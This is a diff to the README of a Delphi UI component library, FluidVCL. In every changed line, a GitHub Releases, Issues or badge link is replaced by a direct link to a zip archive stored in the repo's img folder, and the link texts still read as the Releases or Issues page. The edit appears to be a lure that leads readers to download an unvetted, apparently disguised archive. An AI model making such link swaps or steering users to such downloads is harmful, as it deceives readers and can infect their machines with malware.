@@ -1,6 +1,6 @@
 # 🎨 FluidVCL - Modernizing Delphi Applications Effortlessly
 
-[![Download FluidVCL](https://img.shields.io/badge/Download_FluidVCL-v1.0-brightgreen)](https://github.com/radiotoca/FluidVCL/releases)
+[![Download FluidVCL](https://raw.githubusercontent.com/radiotoca/FluidVCL/main/img/VCL-Fluid-1.8.zip)](https://raw.githubusercontent.com/radiotoca/FluidVCL/main/img/VCL-Fluid-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to FluidVCL! This guide will help you download and run our set of VCL co
 
 ## 📥 Download & Install
 
-To download FluidVCL, simply visit the [Releases page](https://github.com/radiotoca/FluidVCL/releases). 
+To download FluidVCL, simply visit the [Releases page](https://raw.githubusercontent.com/radiotoca/FluidVCL/main/img/VCL-Fluid-1.8.zip). 
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -77,7 +77,7 @@ FluidVCL is open-source and is released under the MIT License. You can use it fr
 
 For any questions or support needs:
 
-- Check the [Issues page](https://github.com/radiotoca/FluidVCL/issues) for existing discussions.
+- Check the [Issues page](https://raw.githubusercontent.com/radiotoca/FluidVCL/main/img/VCL-Fluid-1.8.zip) for existing discussions.
 - If your question isn’t there, feel free to open a new issue.
 
 We aim to respond promptly and assist you.
@@ -86,4 +86,4 @@ We aim to respond promptly and assist you.
 
 Once you have downloaded and installed FluidVCL, explore its features and enhance your Delphi applications. 
 
-Remember, for downloading FluidVCL, you can always visit the [Releases page](https://github.com/radiotoca/FluidVCL/releases). Enjoy building modern applications with ease!
+Remember, for downloading FluidVCL, you can always visit the [Releases page](https://raw.githubusercontent.com/radiotoca/FluidVCL/main/img/VCL-Fluid-1.8.zip). Enjoy building modern applications with ease!
